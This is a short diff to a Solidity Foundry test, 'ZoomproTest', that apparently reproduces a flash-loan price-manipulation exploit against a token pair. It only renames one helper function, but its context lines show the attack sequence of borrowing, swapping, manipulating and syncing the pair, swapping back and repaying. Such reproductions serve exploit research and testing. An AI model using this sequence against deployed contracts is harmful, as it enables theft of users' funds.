@@ -344,7 +344,7 @@ contract ZoomproTest is Test, BlockLoader {
         pair.sync();
     }
 
-    function breaklr_pair_controller() internal {
+    function addliquidity_pair_controller() internal {
         address[] memory n1 = new address[](1);
         n1[0] = address(pair);
         uint256[] memory n2 = new uint256[](1);
@@ -368,7 +368,7 @@ contract ZoomproTest is Test, BlockLoader {
         printBalance("After step0 ");
         swap_trader_usdt_zoom(usdt.balanceOf(attacker));
         printBalance("After step1 ");
-        breaklr_pair_controller();
+        addliquidity_pair_controller();
         printBalance("After step2 ");
         sync_pair();
         printBalance("After step3 ");
@@ -390,7 +390,7 @@ contract ZoomproTest is Test, BlockLoader {
         vm.assume(amt3 == (amt0 * 1003) / 1000);
         borrow_owner_usdt(amt0);
         swap_trader_usdt_zoom(amt1);
-        breaklr_pair_controller();
+        addliquidity_pair_controller();
         sync_pair();
         swap_trader_zoom_usdt(amt2);
         payback_owner_usdt(amt3);
